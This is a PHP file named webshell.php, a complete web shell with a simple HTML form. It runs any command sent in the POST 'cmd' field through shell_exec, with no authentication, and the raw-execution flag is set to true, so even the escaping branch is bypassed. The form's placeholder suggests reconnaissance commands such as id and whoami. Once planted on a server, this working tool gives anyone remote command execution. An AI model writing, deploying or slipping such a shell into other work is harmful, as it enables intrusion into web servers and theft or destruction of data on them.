<?php
// webshell.php

declare(strict_types=1);

$ALLOW_RAW_EXECUTION = true; 

// Initialisations
$cmdInput = $_POST['cmd'] ?? '';
$output = '';
$error = '';

// Traitement de la commande si soumise en POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $cmdInput !== '') {
        if ($ALLOW_RAW_EXECUTION) {
            $output = shell_exec($cmdInput . ' 2>&1');
        } else {
            $safe = escapeshellcmd($cmdInput);
            $output = shell_exec($safe . ' 2>&1');
        }
}

function e(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$displayCmd = $cmdInput;

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: sans-serif; color: rgba(0,0,0,.85); padding: 20px; }
        main { margin: auto; max-width: 900px; }
        pre, input, button { padding: 10px; border-radius: 6px; background: #f3f3f3; }
        input { width: 100%; border: 2px solid transparent; }
        input:focus { outline: none; background: transparent; border: 2px solid #e6e6e6; }
        .form-group { display:flex; gap:8px; margin-top:6px; }
        .output { white-space: pre-wrap; background:#111; color:#eee; padding:12px; border-radius:6px; }
        .small { font-size:0.9rem; color:#666; }
        .error { color: #a00; }
    </style>
</head>
<body>
    <main>
        <h1>Web Shell</h1>
        <h2>Execute a command</h2>

        <form method="post" autocomplete="off">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input
                    type="text"
                    name="cmd"
                    id="cmd"
                    value="<?= e($displayCmd) ?>"
                    onfocus="this.setSelectionRange(this.value.length, this.value.length);"
                    autofocus
                    required
                    placeholder="ex: id || whoami || ls -la"
                >
                <button type="submit">Execute</button>
            </div>
        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h2>Output</h2>

            <?php if ($error !== ''): ?>
                <div class="error"><?= e($error) ?></div>
            <?php endif; ?>

            <?php if ($output !== '' && $output !== null): ?>
                <pre class="output"><?= e($output) ?></pre>
            <?php else: ?>
                <pre class="output"><small>No result.</small></pre>
            <?php endif; ?>
        <?php endif; ?>
    </main>
</body>
</html>

